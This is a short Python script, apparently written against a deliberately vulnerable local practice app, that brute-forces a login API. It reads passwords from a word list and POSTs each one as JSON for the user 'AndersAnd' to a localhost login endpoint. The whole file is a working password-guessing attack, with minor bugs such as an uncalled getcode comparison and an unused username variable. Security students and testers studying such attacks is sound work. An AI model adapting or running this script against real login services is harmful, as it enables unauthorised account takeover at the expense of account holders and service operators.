import requests
from html.parser import HTMLParser
import urllib.request
import urllib.parse
import http.cookiejar
import queue
import threading
import sys
import os
import json
from urllib.error import HTTPError


url = 'http://localhost:8080/securitybackendflaws/api/user/login'
username = 'admin'


def build_password(password_file):
    file = open(password_file)
    passwords = []
    for line in file:
        passwords.append(line.rstrip())
    return passwords


passwords = build_password('passwords.txt')

for passw in passwords:
    try:
        body = {"userName": "AndersAnd", "password": "{}".format(passw)}

        request = urllib.request.Request(url, method='POST')
        jsondata = json.dumps(body)
        jsondataasbytes = jsondata.encode('utf-8')   # needs to be bytes
        request.add_header('Content-Type', 'application/json')
        request.add_header('Content-Length', len(jsondataasbytes))
        print(jsondataasbytes)
        with urllib.request.urlopen(request, jsondataasbytes) as response:

            print(response.getcode())

            if response.getcode == '200':
                print('Password is {}'.format(passw))
            break

    except urllib.error.HTTPError as err:
        print(err.code)
